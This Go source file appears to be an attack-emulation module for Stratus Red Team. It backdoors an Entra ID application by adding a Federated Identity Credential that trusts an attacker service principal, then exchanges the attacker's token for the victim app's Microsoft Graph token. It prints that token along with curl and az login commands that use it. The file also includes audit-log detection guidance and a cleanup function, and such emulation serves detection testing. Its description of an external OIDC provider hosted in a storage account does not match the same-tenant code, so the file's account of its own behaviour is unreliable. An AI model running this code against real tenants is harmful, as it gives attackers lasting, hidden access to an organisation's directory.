package entra_id

import (
	"context"
	"encoding/json"
	_ "embed"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "entra-id.persistence.backdoor-application-fic",
		FriendlyName: "Backdoor Entra ID application with Federated Identity Credential (FIC)",
		Description: `
Backdoors an existing Entra ID application by creating a new Federated Identity Credential (FIC) that trusts an attacker-controlled OIDC provider.

Warm-up:

- Create a victim Entra ID application and associated service principal
- Assign it the <code>Directory Readers</code> role at the tenant level (for illustration purposes)

Detonation:

- Generate a keypair to use for OIDC
- Create an Azure Storage account, then configure it to host OIDC metadata and key
- Add a Federated Identity Credential (FIC) to the victim application that trusts tokens from the malicious OIDC provider
- Create an access token for the victim application as the OIDC provider
- Exchange the attacker's token for a victim application token using the FIC
- Display the victim application's access token to the user

References:

- https://github.com/azurekid/blackcat/pull/84/changes
- https://learn.microsoft.com/en-us/graph/api/resources/federatedidentitycredentials-overview
- https://dirkjanm.io/persisting-with-federated-credentials-entra-apps-managed-identities/
- https://hackingthe.cloud/aws/post_exploitation/iam_rogue_oidc_identity_provider/

`,
		Detection: `
Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs) with the activity type <code>Update application</code>, where <code>ModifiedProperties</code> contains a <code>displayName</code> of <code>Included Updated Properties</code> and a value of <code>FederatedIdentityCredentials</code>.
`,
		Platform:                   stratus.EntraID,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	victimObjectId := params["object_id"]
	victimAppId := params["app_id"]
	attackerAppId := params["attacker_app_id"]
	attackerClientSecret := params["attacker_client_secret"]

	graphClient := providers.EntraId().GetGraphClient()

	log.Println("Backdooring Entra ID application " + victimObjectId + " by creating a new FIC")

	// Get tenant ID
	tenantId, err := providers.EntraId().GetTenantId()
	if err != nil {
		return errors.New("could not retrieve tenant ID: " + err.Error())
	}

	// Create a new FIC that trusts the attacker service principal in the same tenant
	requestBody := graphmodels.NewFederatedIdentityCredential()
	name := "stratus-red-team-same-tenant-fic"
	requestBody.SetName(&name)
	issuer := "https://sts.windows.net/" + tenantId + "/"
	requestBody.SetIssuer(&issuer)

	// Subject is the attacker application ID
	requestBody.SetSubject(&attackerAppId)
	description := "Federated credential trusting attacker service principal"
	requestBody.SetDescription(&description)
	audiences := []string{
		"https://graph.microsoft.com",
	}
	requestBody.SetAudiences(audiences)

	fic, err := graphClient.Applications().ByApplicationId(victimObjectId).FederatedIdentityCredentials().Post(context.Background(), requestBody, nil)
	if err != nil {
		return errors.New("could not create FIC: " + err.Error())
	}

	log.Println("Successfully created FIC with ID: " + *fic.GetId())
	log.Println("FIC trusts tokens from attacker service principal: " + attackerAppId)

	log.Println("Waiting 30s for credentials to update.")
	time.Sleep(40 * time.Second)

	// Step 1: Get token as attacker service principal
	log.Println("\nStep 1: Obtaining token as attacker service principal...")
	attackerToken, err := getTokenAsServicePrincipal(tenantId, attackerAppId, attackerClientSecret)
	if err != nil {
		return errors.New("could not get token as attacker SP: " + err.Error())
	}
	log.Println("Successfully obtained attacker token")

	// Step 2: Exchange attacker token for victim app token using FIC
	log.Println("\nStep 2: Exchanging attacker token for victim application token using FIC...")
	victimToken, err := exchangeTokenUsingFIC(tenantId, victimAppId, attackerToken)
	if err != nil {
		return errors.New("could not exchange token via FIC: " + err.Error())
	}

	log.Println("\n" + strings.Repeat("=", 80))
	log.Println("SUCCESS! Obtained access token for victim application via FIC backdoor")
	log.Println(strings.Repeat("=", 80))
	log.Println("\nAccess Token:")
	log.Println(victimToken)
	log.Println("\nYou can now use this token to access Microsoft Graph API as the victim application:")
	log.Println("\ncurl -H \"Authorization: Bearer " + victimToken + "\" \\")
	log.Println("  https://graph.microsoft.com/v1.0/me")
	log.Println("\nOr with the Azure CLI:")
	log.Println("\naz login --service-principal --allow-no-subscriptions \\")
	log.Println("  --tenant " + tenantId + " \\")
	log.Println("  --username " + victimAppId + " \\")
	log.Println("  --federated-token \"" + attackerToken + "\"")

	return nil
}

// getTokenAsServicePrincipal obtains an access token using client credentials flow
func getTokenAsServicePrincipal(tenantId, clientId, clientSecret string) (string, error) {
	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenantId)

	data := url.Values{}
	data.Set("client_id", clientId)
	data.Set("client_secret", clientSecret)
	data.Set("scope", "api://AzureADTokenExchange/.default")
	data.Set("grant_type", "client_credentials")

	resp, err := http.PostForm(tokenURL, data)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("token request failed with status %d: %s", resp.StatusCode, string(body))
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", err
	}

	token, ok := result["access_token"].(string)
	if !ok {
		return "", errors.New("access_token not found in response")
	}

	return token, nil
}

// exchangeTokenUsingFIC exchanges an attacker token for a victim app token using federated identity credential
func exchangeTokenUsingFIC(tenantId, victimClientId, attackerToken string) (string, error) {
	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenantId)

	data := url.Values{}
	data.Set("client_id", victimClientId)
	data.Set("scope", "https://graph.microsoft.com/.default")
	data.Set("client_assertion_type", "urn:ietf:params:oauth:client-assertion-type:jwt-bearer")
	data.Set("client_assertion", attackerToken)
	data.Set("grant_type", "client_credentials")

	resp, err := http.PostForm(tokenURL, data)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("token exchange failed with status %d: %s", resp.StatusCode, string(body))
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", err
	}

	token, ok := result["access_token"].(string)
	if !ok {
		return "", errors.New("access_token not found in response")
	}

	return token, nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	objectId := params["object_id"]
	graphClient := providers.EntraId().GetGraphClient()

	log.Println("Listing FICs for application " + objectId)
	fics, err := graphClient.Applications().ByApplicationId(objectId).FederatedIdentityCredentials().Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not retrieve FICs: " + err.Error())
	}

	credentials := fics.GetValue()
	if len(credentials) == 0 {
		log.Println("No FICs found to delete")
		return nil
	}

	for _, credential := range credentials {
		ficId := credential.GetId()
		if ficId == nil {
			log.Println("Warning: skipping FIC with nil ID")
			continue
		}

		log.Println("Deleting FIC with ID " + *ficId)
		err := graphClient.Applications().ByApplicationId(objectId).FederatedIdentityCredentials().ByFederatedIdentityCredentialId(*ficId).Delete(context.Background(), nil)
		if err != nil {
			return errors.New("could not delete FIC: " + err.Error())
		}
	}

	log.Println("Successfully removed backdoor FIC(s) from application " + objectId)

	return nil
}